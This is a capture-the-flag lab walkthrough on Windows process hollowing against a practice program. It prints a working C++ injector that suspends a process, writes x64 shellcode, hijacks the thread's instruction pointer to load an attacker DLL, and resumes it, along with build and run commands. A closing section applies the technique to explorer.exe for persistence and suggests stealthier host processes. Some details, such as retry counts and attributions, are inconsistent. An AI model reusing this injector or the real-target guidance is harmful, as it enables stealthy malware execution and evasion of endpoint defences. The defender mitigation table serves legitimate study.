# #15 — Process Hollowing

**Difficulty:** HARD — but the simplified version is approachable.

## What is this attack?

**You start a program suspended, swap its memory for yours, then let it run — the OS thinks it's running the original, but it's running YOUR code.**

In antivirus-speak, this is called **RunPE**. In malware-analysis lingo, "the parent process is a loader; the real payload is hidden inside."

## Why it works

Windows lets you start a process in `CREATE_SUSPENDED` state. The kernel sets everything up — process, main thread, memory layout — but **doesn't execute a single instruction** until you call `ResumeThread`.

Between those two calls, your attacker code has full read/write access to the suspended process's memory. You can:
- Unmap the original PE image
- Map your own PE in its place
- Patch the thread's starting RIP to point at your entry point
- Resume

Task Manager still shows the original binary name. Signed-code checks against the on-disk file still pass. But in-memory, it's your program running.

### Simplified variant used here

Full RunPE requires parsing PE headers, applying relocations, fixing imports, and rewriting the PEB — about 300 lines. For a clearer demonstration (and for grabbing the flag), we use a **soft** variant:

1. Spawn `MVTC.exe` suspended → kernel loads its DLLs, prepares main thread
2. Write a **small x64 stub** into the suspended process. The stub:
   - saves all volatile registers
   - calls `LoadLibraryA("your_flag_reader.dll")`
   - restores registers
   - jumps back to where the thread was going to start
3. Hijack the thread's starting RIP to point at the stub
4. Resume

Now the suspended MVTC starts, loads your DLL first, then continues as normal. Your DLL has code execution inside MVTC's address space during initialization — enough to scan for the sentinel after it's been loaded.

## When attackers use this

- **Masquerading as a signed binary** — launch `svchost.exe` or `explorer.exe` hollowed, your malware runs under a trusted name
- **Bypassing EDR process-name allowlists** — EDR allows `OneDrive.exe` to touch the registry; your malware runs as `OneDrive.exe`
- **Child-process allow-lists** — defender saw `powershell.exe` spawn ONLY once at logon; your hollow spawn blends in

## Tools you need

Same as #13 plus understanding of x64 assembly stub shellcode.

## Step-by-step

### Step 1 — Write the hollow launcher

Save as `hollow15.cpp`:

```cpp
#include <windows.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char** argv) {
    if (argc != 3) {
        printf("Usage: %s <path-to-target.exe> <path-to-DLL>\n", argv[0]);
        return 1;
    }

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    // 1. Spawn target SUSPENDED
    CreateProcessA(argv[1], nullptr, nullptr, nullptr, FALSE,
                   CREATE_SUSPENDED, nullptr, nullptr, &si, &pi);

    // 2. Save the original RIP so we can jump back later
    CONTEXT ctx = {}; ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    DWORD64 origRip = ctx.Rip;

    // 3. Write the DLL path into the suspended child
    size_t len = strlen(argv[2]) + 1;
    LPVOID pathBuf = VirtualAllocEx(pi.hProcess, nullptr, len,
                                    MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(pi.hProcess, pathBuf, argv[2], len, nullptr);

    // 4. Build the x64 stub. Pseudo-assembly:
    //    pushfq; push rax,rcx,rdx,r8,r9,r10,r11
    //    mov rcx, pathBuf; mov rax, LoadLibraryA
    //    sub rsp,0x28; call rax; add rsp,0x28
    //    pop r11,r10,r9,r8,rdx,rcx,rax; popfq
    //    mov rax, origRip; jmp rax
    LPVOID llA = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    unsigned char stub[] = {
        0x9C, 0x50, 0x51, 0x52,                       // pushfq; push rax/rcx/rdx
        0x41,0x50, 0x41,0x51, 0x41,0x52, 0x41,0x53,   // push r8/r9/r10/r11
        0x48,0xB9, 0,0,0,0,0,0,0,0,                   // mov rcx, pathBuf
        0x48,0xB8, 0,0,0,0,0,0,0,0,                   // mov rax, LoadLibraryA
        0x48,0x83,0xEC,0x28,                          // sub rsp, 0x28
        0xFF,0xD0,                                    // call rax
        0x48,0x83,0xC4,0x28,                          // add rsp, 0x28
        0x41,0x5B, 0x41,0x5A, 0x41,0x59, 0x41,0x58,   // pop r11/r10/r9/r8
        0x5A, 0x59, 0x58,                             // pop rdx/rcx/rax
        0x9D,                                         // popfq
        0x48,0xB8, 0,0,0,0,0,0,0,0,                   // mov rax, origRip
        0xFF,0xE0                                     // jmp rax
    };
    memcpy(stub + 14, &pathBuf, 8);
    memcpy(stub + 24, &llA,     8);
    memcpy(stub + 56, &origRip, 8);

    // 5. Write stub into target, make it executable
    LPVOID stubAddr = VirtualAllocEx(pi.hProcess, nullptr, sizeof(stub),
                                     MEM_COMMIT|MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, stubAddr, stub, sizeof(stub), nullptr);

    // 6. Hijack RIP to our stub
    ctx.Rip = (DWORD64)stubAddr;
    SetThreadContext(pi.hThread, &ctx);

    // 7. Resume → OS starts the process, first instructions are OUR stub
    ResumeThread(pi.hThread);

    Sleep(15000);  // Let the host finish initializing
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
```

### Why the stub saves ALL volatile registers

When `ResumeThread` fires, Windows is about to execute `ntdll!RtlUserThreadStart`. That function expects:
- `RCX` = address of the real thread entry point
- `RDX` = argument to pass to it

If our stub overwrites `RCX` with `pathBuf` for the `LoadLibraryA` call and doesn't restore it, `RtlUserThreadStart` crashes. The register-saving dance preserves the kernel's expected initial state.

### Step 2 — Write the flag reader DLL

Same as #13's `flag_reader.cpp` but:
- Needle is `v15_` instead of `v13_`
- Scan in a retry loop (10-20 attempts, 500ms apart) because the sentinel appears only *after* MVTC finishes its startup

```cpp
static DWORD WINAPI RetryThread(LPVOID) {
    FILE* f = fopen("C:\\loot\\flag15.txt", "w");
    for (int attempt = 1; attempt <= 40; ++attempt) {
        if (scan_once(f)) { fclose(f); return 0; }
        Sleep(500);
    }
    fclose(f);
    return 1;
}
```

### Step 3 — Build

```bash
cl /EHsc /O2 /nologo hollow15.cpp /link /OUT:hollow15.exe
cl /LD /EHsc /O2 /nologo flag_reader15.cpp /link /OUT:flag_reader15.dll
```

### Step 4 — Run

```bash
hollow15.exe "C:\Program Files (x86)\M14R41 Labs\MVTC\MVTC.exe" C:\full\path\to\flag_reader15.dll
```

A second MVTC window opens. The DLL fires inside it, scans, and after 1-3 retries finds the sentinel.

### Step 5 — Read the flag

```powershell
type C:\loot\flag15.txt
```

## How to apply this to a real target

### Classic: hollow explorer.exe to persist

```bash
hollow15.exe C:\Windows\explorer.exe C:\attacker\persistence.dll
```

Only one `explorer.exe` is expected; killing yours and replacing it is noisy. For stealth, hollow `cmd.exe` or `conhost.exe` which fire often.

### Advanced: full RunPE (not shown here)

Replace steps 3-4 with:
1. Call `NtUnmapViewOfSection` on the suspended process to unmap its PE image
2. `VirtualAllocEx` at the preferred base of YOUR replacement PE
3. Copy YOUR PE's sections into target
4. Apply YOUR relocations
5. Patch the PEB's `ImageBaseAddress`
6. `SetThreadContext` → RIP at YOUR entry point

This is the Stephen Fewer-style classic. Reference implementations are everywhere on GitHub.

## How defenders fix this

| Mitigation | Effect |
|---|---|
| **Attack Surface Reduction** rule `56a863a9-875e-4185-98a7-b882c64b5ce5` | Blocks executable content from mail/web spawning child processes |
| Code Integrity Guard | Blocks loading your unsigned DLL into a signed host |
| Protected Processes (PPL) | OpenProcess with VM_WRITE requires caller to also be PPL |
| EDR behavior analytics | Flags `CreateProcess(SUSPENDED) → WriteProcessMemory → ResumeThread` sequence |
| Sysmon event ID 10 | Process access with `0x1F3FFF` (`PROCESS_ALL_ACCESS`) + `GrantedAccess:0x1FFFFF` is a hollow signature |

## Flag captured

```
MVTC{v15_hol_████████████████████}
```
